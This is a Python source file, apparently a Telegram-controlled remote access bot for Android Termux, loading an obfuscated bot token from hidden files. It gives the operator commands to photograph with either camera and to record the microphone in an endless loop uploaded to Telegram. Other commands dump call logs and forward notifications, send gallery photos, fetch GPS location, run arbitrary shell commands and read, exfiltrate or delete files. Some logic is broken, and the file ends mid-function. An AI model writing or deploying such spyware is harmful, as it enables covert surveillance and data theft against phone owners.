#!/usr/bin/env python3
import base64, json, hashlib, os

def _d(enc, key):
    kb = hashlib.sha256(key.encode()).digest()
    raw = base64.b64decode(enc.encode())
    return bytes([c ^ kb[i % len(kb)] for i, c in enumerate(raw)]).decode()

def _load():
    try:
        kf  = open("/storage/emulated/0/.botcache/.owner.key").read().strip()
        key = base64.b64decode(kf.encode()).decode()
        cfg = json.load(open("/storage/emulated/0/.botcache/.owner.enc"))
        return _d(cfg["t"], key), int(_d(cfg["c"], key))
    except:
        return "", 0
        return "", 0

BOT_TOKEN, ALLOWED_ID = _load()

import subprocess, logging, os, json, time, shutil, datetime, requests as req


from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

import requests as req

def send_startup_notification():
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hostname = os.uname().nodename
    
    message = (
        "🟢 <b>Bot Active!AHM</b>\n\n"
        f"🖥️ <b>Device:</b> {hostname}\n"
        f"🕐 <b>Time:</b> {now}\n"
        "✅ <b>Status:</b> Active & Ready"
    )
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    req.post(url, data={
        "chat_id": ALLOWED_ID,
        "text": message,
        "parse_mode": "HTML"
    })

# স্ক্রিপ্ট শুরুতেই নোটিফিকেশন পাঠাও
send_startup_notification()
logging.basicConfig(level=logging.CRITICAL)
HOME = os.path.expanduser("~")

# ─────────────────────────────────────────
# SESSION STATE (current working directory)
# ─────────────────────────────────────────
session = {
    "cwd": HOME
}

def auth(update: Update) -> bool:
    return update.effective_chat.id == ALLOWED_ID

def shell(cmd: str, timeout=60, cwd=None) -> str:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout,
            cwd=cwd or session["cwd"]
        )
        out = r.stdout.strip()
        err = r.stderr.strip()
        return out or err or "Done (no output)"
    except subprocess.TimeoutExpired:
        return "Timeout!"
    except Exception as e:
        return f"Error: {e}"

# ─────────────────────────────────────────
# START
# ─────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text(
        "🤖 Remote Control Bot ACTIVE\n\n"
        " --:Created By Tech AHM YT:--\n\n"
        "📊 SYSTEM:\n"
        "/battery    - Battery status\n"
        "/info       - Device info\n"
        "/storage    - Storage info\n"
        "/wifi       - WiFi info\n"
        "/ip         - IP address\n\n"
        "📸 MEDIA:\n"
        "/screenshot - Take screenshot\n"
        "/cam_front  - Front camera\n"
        "/cam_back   - Back camera\n"
        "/calls      - 3Days Call_history\n"
        "/audio      - recording loop i mnt \n"
        "/gallery    - Get Recent 10 photo\n\n"
        "⚙️ HARDWARE:\n"
        "/vibrate    - Vibrate phone\n"
        "/torch_on   - Torch ON\n"
        "/torch_off  - Torch OFF\n"
        "/lock       - Lock screen\n\n"
        "🔊 AUDIO:\n"
        "/vol_up     - Volume up\n"
        "/vol_down   - Volume down\n"
        "/mute       - Mute all sound\n"
        "/unmute     - Unmute sound\n\n"
        "📁 FILE MANAGEMENT:\n"
        "/ls [path]          - List files\n"
        "/cd <path>          - Change directory\n"
        "/pwd                - Current directory\n"
        "/mkdir <name>       - Create folder\n"
        "/touch <name>       - Create empty file\n"
        "/rm <path>          - Delete file/folder\n"
        "/mv <src> <dst>     - Move/Rename\n"
        "/cp <src> <dst>     - Copy file\n"
        "/cat <file>         - Read file content\n"
        "/write <file> <txt> - Write text to file\n"
        "/find <name>        - Search file by name\n"
        "/fileinfo <path>    - File details\n"
        "/get <path>         - Download file\n"
        "/upload             - Upload file (reply)\n"
        "/tree [path]        - Folder tree view\n\n"
        "🌐 OTHER:\n"
        "/notify [msg] - Send notification\n"
        "/notifications  → all active notification see\n"
        "/notif          → new notification auto forward\n"
        "/stop_notif     → forward stop\n"
        "/location     - GPS location\n"
        "/shell [cmd]  - Run command\n"
        "/sh [cmd]     - Short alias\n"
    )

# ─────────────────────────────────────────
# BATTERY
# ─────────────────────────────────────────
async def battery(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-battery-status")
    try:
        d = json.loads(result)
        await update.message.reply_text(
            f"🔋 Battery Status:\n"
            f"Level  : {d.get('percentage','N/A')}%\n"
            f"Status : {d.get('status','N/A')}\n"
            f"Health : {d.get('health','N/A')}\n"
            f"Temp   : {d.get('temperature','N/A')} °C\n"
            f"Plug   : {d.get('plugged','N/A')}"
        )
    except Exception:
        await update.message.reply_text(f"🔋 Battery:\n{result}")
import threading as _threading
audio_stop_event = _threading.Event()
audio_stop_event.set()

async def audio(update, ctx):
    if not auth(update): return
    global audio_stop_event

    if not audio_stop_event.is_set():
        await update.message.reply_text("⚠️ Recording আগে থেকেই চলছে! বন্ধ করতে /stop_audio")
        return

    audio_stop_event.clear()
    chat_id = update.effective_chat.id

    await update.message.reply_text("🎙️ Recording শুরু হয়েছে!\nবন্ধ করতে /stop_audio")

    import threading, requests as _req, os

    def record_loop():
        count = 1
        while not audio_stop_event.is_set():
            path = f"/storage/emulated/0/audio_{count}.mp3"
            os.system(f"termux-microphone-record -l 60 -f {path} > /dev/null 2>&1")
            os.system("termux-microphone-record -q > /dev/null 2>&1")

            if os.path.exists(path) and os.path.getsize(path) > 0:
                try:
                    _req.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio",
                        data={"chat_id": chat_id, "title": f"Recording {count}"},
                        files={"audio": open(path, "rb")},
                        timeout=30
                    )
                    os.remove(path)
                except Exception as e:
                    pass
            count += 1

    t = threading.Thread(target=record_loop, daemon=True)
    t.start()

async def stop_audio(update, ctx):
    if not auth(update): return
    global audio_stop_event
    audio_stop_event.set()
    os.system("termux-microphone-record -q > /dev/null 2>&1")
    await update.message.reply_text("🛑 Recording বন্ধ হয়েছে!")

async def call_history(update, ctx):
    if not auth(update): return
    result = shell("termux-call-log -l 50")
    
    if "error" in result.lower() or not result:
        await update.message.reply_text("❌ Call history পাওয়া যায়নি!\nTermux:API app install আছে কিনা চেক করুন।")
        return
    
    import json, datetime
    
    try:
        logs = json.loads(result)
        
        # শেষ ৩ দিনের filter করো
        from datetime import datetime, timedelta
        three_days_ago = datetime.now() - timedelta(days=3)
        
        recent = []
        for call in logs:
            try:
                call_time = datetime.strptime(
                    call["date"], "%Y-%m-%d %H:%M:%S"
                )
                if call_time >= three_days_ago:
                    recent.append(call)
            except:
                continue
        
        if not recent:
            await update.message.reply_text("📵 শেষ ৩ দিনে কোনো call নেই!")
            return
        
        msg = "📞 <b>শেষ ৩ দিনের Call History:</b>\n\n"
        for call in recent[:30]:
            type_emoji = {
                "INCOMING": "📲",
                "OUTGOING": "📤",
                "MISSED":   "❌"
            }.get(call.get("type", ""), "📞")
            
            msg += (
                # নতুন
f"{type_emoji} <b>{call.get('name', 'Unknown')}</b>\n"
f"   📱 {call.get('phone_number', 'N/A')}\n"
                f"   📅 {call.get('date', 'N/A')}\n"
                f"   ⏱️ {call.get('duration', 0)} সেকেন্ড\n\n"
            )
        
        # message বড় হলে ভাগ করো
        if len(msg) > 4000:
            for i in range(0, len(msg), 4000):
                await update.message.reply_text(msg[i:i+4000], parse_mode="HTML")
        else:
            await update.message.reply_text(msg, parse_mode="HTML")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ════════════════════════════════════════════
# NOTIFICATION SYSTEM
# ════════════════════════════════════════════

import threading as _notif_th
notif_stop_event = _notif_th.Event()
notif_stop_event.set()
last_notifs = set()
notif_lock = _notif_th.Lock()

async def notifications(update, ctx):
    if not auth(update): return
    result = shell("termux-notification-list")
    if not result or "error" in result.lower():
        await update.message.reply_text("❌ Notification পাওয়া যায়নি!\nSettings → Notification Access → Termux:API → ON করুন")
        return
    try:
        import json
        notifs = json.loads(result)
        if not notifs:
            await update.message.reply_text("📭 কোনো notification নেই!")
            return
        msg = "🔔 <b>Active Notifications:</b>\n\n"
        for n in notifs[:20]:
            app   = n.get("packageName", "Unknown").split(".")[-1]
            title = n.get("title", "")
            text  = n.get("content", "")
            msg  += f"📱 <b>{app}</b>\n"
            if title: msg += f"   📌 {title}\n"
            if text:  msg += f"   💬 {text}\n"
            msg  += "\n"
        if len(msg) > 4000:
            for i in range(0, len(msg), 4000):
                await update.message.reply_text(msg[i:i+4000], parse_mode="HTML")
        else:
            await update.message.reply_text(msg, parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def start_notif_forward(update, ctx):
    if not is_owner(update): return
    global notif_stop_event, last_notifs

    if not notif_stop_event.is_set():
        await update.message.reply_text("⚠️ আগে থেকেই চলছে! বন্ধ করতে /stop_notif")
        return

    notif_stop_event.clear()
    chat_id = update.effective_chat.id
    await update.message.reply_text("🔔 Notification Forward চালু!\nবন্ধ করতে /stop_notif")

    import threading, requests as _req, json, time

    def notif_loop():
        global last_notifs
        import subprocess as _sp, json as _json, time as _time, requests as _req
        while not notif_stop_event.is_set():
            try:
                result = _sp.run(
                    ["termux-notification-list"],
                    capture_output=True, text=True, timeout=15
                ).stdout.strip()

                if not result:
                    _time.sleep(3)
                    continue

                notifs = _json.loads(result)
                current = set()

                for n in notifs:
                    nid   = str(n.get("id","")) + n.get("packageName","") + str(n.get("title",""))
                    current.add(nid)

                    if nid not in last_notifs and nid not in current:
                        app   = n.get("packageName","Unknown").split(".")[-1]
                        title = n.get("title","")
                        text  = n.get("content","")
                        msg   = f"🔔 <b>New Notification!</b>\n\n📱 <b>{app}</b>\n"
                        if title: msg += f"📌 {title}\n"
                        if text:  msg += f"💬 {text}"

                        try:
                            _req.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                data={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
                                timeout=10
                            )
                        except:
                            pass

                with notif_lock:
                    last_notifs = current

            except _json.JSONDecodeError:
                pass
            except Exception as e:
                pass

            _time.sleep(3)

    import threading as _th
    t = _th.Thread(target=notif_loop, daemon=False)
    t.start()

async def stop_notif(update, ctx):
    if not is_owner(update): return
    global notif_stop_event
    notif_stop_event.set()
    await update.message.reply_text("🛑 Notification Forward বন্ধ হয়েছে!")

# ─────────────────────────────────────────
# DEVICE INFO
# ─────────────────────────────────────────
async def info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    cmds = {
        "Model"  : "getprop ro.product.model",
        "Brand"  : "getprop ro.product.brand",
        "Android": "getprop ro.build.version.release",
        "Uptime" : "uptime -p",
        "RAM"    : "free -m | grep Mem | awk '{print $2\" MB total / \"$3\" MB used\"}'",
    }
    msg = "📱 Device Info:\n"
    for k, c in cmds.items():
        r = subprocess.run(c, shell=True, capture_output=True, text=True)
        msg += f"{k:8}: {r.stdout.strip() or 'N/A'}\n"
    await update.message.reply_text(msg)

# ─────────────────────────────────────────
# STORAGE
# ─────────────────────────────────────────
async def storage(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    r = shell(
        "df -h ~/storage/shared 2>/dev/null || "
        "df -h /storage/emulated/0 2>/dev/null || "
        "df -h ~"
    )
    await update.message.reply_text(f"💾 Storage:\n{r}")

# ─────────────────────────────────────────
# WIFI
# ─────────────────────────────────────────
async def wifi(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-wifi-connectioninfo")
    try:
        d = json.loads(result)
        await update.message.reply_text(
            f"📶 WiFi Info:\n"
            f"SSID   : {d.get('ssid','N/A')}\n"
            f"IP     : {d.get('ip','N/A')}\n"
            f"Signal : {d.get('rssi','N/A')} dBm\n"
            f"Speed  : {d.get('link_speed','N/A')} Mbps"
        )
    except Exception:
        await update.message.reply_text(f"📶 WiFi:\n{result}")

# ─────────────────────────────────────────
# IP
# ─────────────────────────────────────────
async def ip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    local = shell(
        "ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' || "
        "ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' || "
        "hostname -I 2>/dev/null | awk '{print $1}'"
    )
    public = shell("curl -s --max-time 10 ifconfig.me 2>/dev/null || curl -s --max-time 10 api.ipify.org 2>/dev/null")
    await update.message.reply_text(
        f"🌐 IP Addresses:\n"
        f"Local  : {local or 'Not found'}\n"
        f"Public : {public or 'Not found'}"
    )

# ─────────────────────────────────────────
# SCREENSHOT
# ─────────────────────────────────────────
async def screenshot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text(
        "Screenshot is not supported on non-rooted devices.\n\n"
        "Alternatives:\n"
        "/cam_back  - Take photo with back camera\n"
        "/cam_front - Take photo with front camera"
    )

# ─────────────────────────────────────────
# CAMERA
# ─────────────────────────────────────────
async def cam_front(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text("📸 Capturing front camera...")
    path = f"{HOME}/rc_front.jpg"
    if os.path.exists(path):
        os.remove(path)
    result = shell(f"termux-camera-photo -c 1 {path} 2>&1", timeout=30)
    if not os.path.exists(path):
        await update.message.reply_text(f"Camera failed.\nDebug: {result}")
        return
    try:
        with open(path, 'rb') as f:
            await update.message.reply_photo(f, caption="📸 Front Camera")
        os.remove(path)
    except Exception as e:
        await update.message.reply_text(f"Failed: {e}")

async def cam_back(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text("📸 Capturing back camera...")
    path = f"{HOME}/rc_back.jpg"
    if os.path.exists(path):
        os.remove(path)
    result = shell(f"termux-camera-photo -c 0 {path} 2>&1", timeout=30)
    if not os.path.exists(path):
        await update.message.reply_text(f"Camera failed.\nDebug: {result}")
        return
    try:
        with open(path, 'rb') as f:
            await update.message.reply_photo(f, caption="📸 Back Camera")
        os.remove(path)
    except Exception as e:
        await update.message.reply_text(f"Failed: {e}")

gallery_stop_event = __import__('threading').Event()

async def gallery(update, ctx):
    if not auth(update): return
    global gallery_stop_event

    if not gallery_stop_event.is_set():
        await update.message.reply_text("⚠️ Gallery আগে থেকেই চলছে! বন্ধ করতে /stop_gallery")
        return

    import glob
    gallery_stop_event.clear()

    photos = []
    paths = [
        "/storage/emulated/0/DCIM/**/*.jpg",
        "/storage/emulated/0/DCIM/**/*.jpeg",
        "/storage/emulated/0/DCIM/**/*.png",
        "/storage/emulated/0/Pictures/**/*.jpg",
    ]

    for path in paths:
        photos.extend(glob.glob(path, recursive=True))

    if not photos:
        await update.message.reply_text("❌ কোনো ছবি পাওয়া যায়নি!")
        gallery_stop_event.set()
        return

    photos.sort(key=os.path.getmtime, reverse=True)
    limit = int(ctx.args[0]) if ctx.args else 10
    recent = photos[:limit]

    await update.message.reply_text(f"📸 {len(recent)}টি ছবি পাঠাচ্ছি... বন্ধ করতে /stop_gallery")

    for photo in recent:
        if gallery_stop_event.is_set():
            await update.message.reply_text("🔴 Gallery বন্ধ করা হয়েছে!")
            return
        try:
            await update.message.reply_photo(open(photo, "rb"))
        except:
            pass
        if gallery_stop_event.is_set():
            await update.message.reply_text("🛑 Gallery বন্ধ করা হয়েছে!")
            return
        try:
            await update.message.reply_photo(open(photo, "rb"))
        except:
            pass

    gallery_stop_event.set()
    await update.message.reply_text("✅ সব ছবি পাঠানো হয়েছে!")

async def stop_gallery(update, ctx):
    if not auth(update): return
    global gallery_stop_event
    gallery_stop_event.set()
    await update.message.reply_text("🛑 Gallery বন্ধ করা হয়েছে!")

# ─────────────────────────────────────────
# VIBRATE
# ─────────────────────────────────────────
async def vibrate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("termux-vibrate -d 1000 -f")
    await update.message.reply_text("📳 Vibrating!")

# ─────────────────────────────────────────
# TORCH
# ─────────────────────────────────────────
async def torch_on(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("termux-torch on")
    await update.message.reply_text("🔦 Torch ON")

async def torch_off(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("termux-torch off")
    await update.message.reply_text("🔦 Torch OFF")

# ─────────────────────────────────────────
# LOCK SCREEN
# ─────────────────────────────────────────
async def lock(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("input keyevent KEYCODE_POWER 2>/dev/null || "
          "input keyevent 26 2>/dev/null || "
          "termux-keystore 2>/dev/null")
    await update.message.reply_text(
        "🔒 Lock command sent!\n"
        "(Power button keyevent triggered)\n\n"
        "Note: If screen is not locking,\n"
        "enable Accessibility Service for Termux."
    )

# ─────────────────────────────────────────
# VOLUME
# ─────────────────────────────────────────
async def vol_up(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-volume 2>/dev/null")
    try:
        volumes = json.loads(result)
        current = next((v['volume'] for v in volumes if v['stream'] == 'music'), 5)
        new_vol = min(current + 2, 15)
        shell(f"termux-volume music {new_vol}")
        await update.message.reply_text(f"🔊 Volume UP: {current} → {new_vol}")
    except Exception:
        shell("termux-volume music 10")
        await update.message.reply_text("🔊 Volume set to 10")

async def vol_down(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-volume 2>/dev/null")
    try:
        volumes = json.loads(result)
        current = next((v['volume'] for v in volumes if v['stream'] == 'music'), 5)
        new_vol = max(current - 2, 0)
        shell(f"termux-volume music {new_vol}")
        await update.message.reply_text(f"🔉 Volume DOWN: {current} → {new_vol}")
    except Exception:
        shell("termux-volume music 3")
        await update.message.reply_text("🔉 Volume set to 3")

# ─────────────────────────────────────────
# MUTE / UNMUTE
# ─────────────────────────────────────────
async def mute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    streams = ['music', 'notification', 'ring', 'alarm', 'system']
    for s in streams:
        shell(f"termux-volume {s} 0 2>/dev/null")
    shell("input keyevent KEYCODE_VOLUME_MUTE 2>/dev/null")
    await update.message.reply_text("🔇 All sound MUTED")

async def unmute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    streams = {'music': 8, 'notification': 5, 'ring': 8, 'alarm': 8, 'system': 5}
    for s, v in streams.items():
        shell(f"termux-volume {s} {v} 2>/dev/null")
    await update.message.reply_text("🔔 Sound UNMUTED (restored to default)")

# ═════════════════════════════════════════
# FILE MANAGEMENT SYSTEM
# ═════════════════════════════════════════

def resolve_path(path: str) -> str:
    """Resolve path relative to current working directory."""
    if os.path.isabs(path):
        return os.path.normpath(path)
    return os.path.normpath(os.path.join(session["cwd"], path))

# ─────────────────────────────────────────
# PWD - Print Working Directory
# ─────────────────────────────────────────
async def pwd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text(f"📍 Current Directory:\n{session['cwd']}")

# ─────────────────────────────────────────
# CD - Change Directory
# ─────────────────────────────────────────
async def cd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        # cd without args → go to HOME
        session["cwd"] = HOME
        await update.message.reply_text(f"📁 Changed to: {HOME}")
        return

    raw = " ".join(ctx.args)

    # Handle cd.. or cd ..
    if raw.strip() in ("..", "cd..", ".."):
        new_path = os.path.dirname(session["cwd"])
    elif raw == "-":
        # Go to home
        new_path = HOME
    else:
        new_path = resolve_path(raw)

    if not os.path.exists(new_path):
        await update.message.reply_text(f"❌ Directory not found:\n{new_path}")
        return
    if not os.path.isdir(new_path):
        await update.message.reply_text(f"❌ Not a directory:\n{new_path}")
        return

    session["cwd"] = new_path
    await update.message.reply_text(f"📁 Changed to:\n{session['cwd']}")

# ─────────────────────────────────────────
# LS - List Files
# ─────────────────────────────────────────
async def ls(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if ctx.args:
        path = resolve_path(" ".join(ctx.args))
    else:
        path = session["cwd"]

    r = shell(f"ls -lh '{path}' 2>&1 | head -50")
    await update.message.reply_text(f"📂 [{path}]:\n{r}")

# ─────────────────────────────────────────
# MKDIR - Create Directory
# ─────────────────────────────────────────
async def mkdir(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /mkdir <folder_name>")
        return
    name = " ".join(ctx.args)
    path = resolve_path(name)
    try:
        os.makedirs(path, exist_ok=True)
        await update.message.reply_text(f"✅ Folder created:\n{path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# TOUCH - Create Empty File
# ─────────────────────────────────────────
async def touch(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /touch <filename>")
        return
    name = " ".join(ctx.args)
    path = resolve_path(name)
    try:
        with open(path, 'a'):
            os.utime(path, None)
        await update.message.reply_text(f"✅ File created:\n{path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# RM - Delete File or Folder
# ─────────────────────────────────────────
async def rm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /rm <path>\nExample: /rm myfile.txt")
        return
    name = " ".join(ctx.args)
    path = resolve_path(name)
    try:
        if not os.path.exists(path):
            await update.message.reply_text(f"❌ Not found:\n{path}")
            return
        if os.path.isdir(path):
            shutil.rmtree(path)
            await update.message.reply_text(f"🗑️ Folder deleted:\n{path}")
        else:
            os.remove(path)
            await update.message.reply_text(f"🗑️ File deleted:\n{path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# MV - Move or Rename
# ─────────────────────────────────────────
async def mv(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args or len(ctx.args) < 2:
        await update.message.reply_text(
            "Usage: /mv <source> <destination>\n"
            "Example: /mv old.txt new.txt\n"
            "         /mv file.txt /sdcard/Download/"
        )
        return
    src = resolve_path(ctx.args[0])
    dst = resolve_path(ctx.args[1])
    try:
        if not os.path.exists(src):
            await update.message.reply_text(f"❌ Source not found:\n{src}")
            return
        shutil.move(src, dst)
        await update.message.reply_text(f"✅ Moved/Renamed:\n{src}\n→ {dst}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# CP - Copy File
# ─────────────────────────────────────────
async def cp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args or len(ctx.args) < 2:
        await update.message.reply_text(
            "Usage: /cp <source> <destination>\n"
            "Example: /cp file.txt backup.txt"
        )
        return
    src = resolve_path(ctx.args[0])
    dst = resolve_path(ctx.args[1])
    try:
        if not os.path.exists(src):
            await update.message.reply_text(f"❌ Source not found:\n{src}")
            return
        if os.path.isdir(src):
            shutil.copytree(src, dst)
        else:
            shutil.copy2(src, dst)
        await update.message.reply_text(f"✅ Copied:\n{src}\n→ {dst}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# CAT - Read File Content
# ─────────────────────────────────────────
async def cat(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /cat <filename>")
        return
    name = " ".join(ctx.args)
    path = resolve_path(name)
    try:
        if not os.path.exists(path):
            await update.message.reply_text(f"❌ File not found:\n{path}")
            return
        if os.path.isdir(path):
            await update.message.reply_text(f"❌ That's a directory, use /ls")
            return
        size = os.path.getsize(path)
        if size > 1024 * 1024:  # 1MB limit for reading
            await update.message.reply_text(f"❌ File too large to read ({size//1024} KB). Use /get to download.")
            return
        with open(path, 'r', errors='replace') as f:
            content = f.read(4000)
        await update.message.reply_text(f"📄 {os.path.basename(path)}:\n\n{content}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# WRITE - Write Text to File
# ─────────────────────────────────────────
async def write(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args or len(ctx.args) < 2:
        await update.message.reply_text(
            "Usage: /write <filename> <text>\n"
            "Example: /write notes.txt Hello World"
        )
        return
    filename = ctx.args[0]
    content = " ".join(ctx.args[1:])
    path = resolve_path(filename)
    try:
        with open(path, 'w') as f:
            f.write(content)
        await update.message.reply_text(f"✅ Written to:\n{path}\n\nContent:\n{content[:200]}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# FIND - Search File by Name
# ─────────────────────────────────────────
async def find(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /find <filename>\nExample: /find *.txt")
        return
    name = ctx.args[0]
    search_dir = session["cwd"]
    r = shell(f"find '{search_dir}' -name '{name}' 2>/dev/null | head -20")
    if not r or r == "Done (no output)":
        await update.message.reply_text(f"🔍 No files found matching: {name}")
    else:
        await update.message.reply_text(f"🔍 Found (in {search_dir}):\n{r}")

# ─────────────────────────────────────────
# FILEINFO - File Details
# ─────────────────────────────────────────
async def fileinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /fileinfo <path>")
        return
    name = " ".join(ctx.args)
    path = resolve_path(name)
    try:
        if not os.path.exists(path):
            await update.message.reply_text(f"❌ Not found:\n{path}")
            return
        stat = os.stat(path)
        size = stat.st_size
        size_str = (
            f"{size} B" if size < 1024 else
            f"{size/1024:.1f} KB" if size < 1024**2 else
            f"{size/1024**2:.2f} MB"
        )
        mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stat.st_mtime))
        ftype = "📁 Directory" if os.path.isdir(path) else "📄 File"
        await update.message.reply_text(
            f"ℹ️ File Info:\n"
            f"Name  : {os.path.basename(path)}\n"
            f"Type  : {ftype}\n"
            f"Size  : {size_str}\n"
            f"Path  : {path}\n"
            f"Modified: {mtime}\n"
            f"Perms : {oct(stat.st_mode)[-3:]}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# TREE - Folder Tree View
# ─────────────────────────────────────────
async def tree(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if ctx.args:
        path = resolve_path(" ".join(ctx.args))
    else:
        path = session["cwd"]
    r = shell(f"tree '{path}' -L 2 --noreport 2>/dev/null || find '{path}' -maxdepth 2 2>/dev/null | head -40")
    await update.message.reply_text(f"🌳 Tree [{path}]:\n{r}")

# ─────────────────────────────────────────
# GET - Download File
# ─────────────────────────────────────────
async def get_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /get <path>\nExample: /get myfile.txt")
        return
    name = " ".join(ctx.args)
    path = resolve_path(name)
    try:
        if not os.path.exists(path):
            await update.message.reply_text(f"❌ Not found:\n{path}")
            return
        if os.path.getsize(path) > 50 * 1024 * 1024:
            await update.message.reply_text("❌ File too large! Max 50MB.")
            return
        with open(path, 'rb') as f:
            await update.message.reply_document(f, caption=f"📥 {os.path.basename(path)}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# UPLOAD - Receive File from Telegram
# ─────────────────────────────────────────
async def upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    # Check if a document/file was sent with the command
    if update.message.document:
        doc = update.message.document
        filename = doc.file_name or "uploaded_file"
        save_path = os.path.join(session["cwd"], filename)
        try:
            file = await ctx.bot.get_file(doc.file_id)
            await file.download_to_drive(save_path)
            size = os.path.getsize(save_path)
            size_str = f"{size/1024:.1f} KB" if size < 1024**2 else f"{size/1024**2:.2f} MB"
            await update.message.reply_text(
                f"✅ File uploaded!\n"
                f"Name : {filename}\n"
                f"Size : {size_str}\n"
                f"Saved: {save_path}"
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Upload failed: {e}")
    else:
        await update.message.reply_text(
            "📤 How to upload a file:\n"
            "1. Send/attach a file in Telegram\n"
            "2. Add caption: /upload\n\n"
            f"Files will be saved to:\n{session['cwd']}"
        )

# Override message handler for file uploads
async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not update.message.document:
        return
    # Auto-save any document sent to the bot
    doc = update.message.document
    filename = doc.file_name or "uploaded_file"
    save_path = os.path.join(session["cwd"], filename)
    try:
        file = await ctx.bot.get_file(doc.file_id)
        await file.download_to_drive(save_path)
        size = os.path.getsize(save_path)
        size_str = f"{size/1024:.1f} KB" if size < 1024**2 else f"{size/1024**2:.2f} MB"
        await update.message.reply_text(
            f"✅ File saved!\n"
            f"Name : {filename}\n"
            f"Size : {size_str}\n"
            f"Path : {save_path}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Upload failed: {e}")

# ─────────────────────────────────────────
# NOTIFY
# ─────────────────────────────────────────
async def notify(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("Usage: /notify your message")
        return
    msg = " ".join(ctx.args)
    shell(f'termux-notification --title "Remote Bot" --content "{msg}" --id 99')
    await update.message.reply_text(f"🔔 Notification sent: {msg}")

# ─────────────────────────────────────────
# LOCATION
# ─────────────────────────────────────────
async def location(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text(
        "📍 Getting location...\n"
        "Trying GPS first, then network...\n"
        "Please wait up to 30 seconds."
    )
    result = shell("termux-location -p gps -r once 2>&1", timeout=40)
    if not result or "error" in result.lower() or "{" not in result:
        await update.message.reply_text("GPS failed, trying network provider...")
        result = shell("termux-location -p network -r once 2>&1", timeout=20)
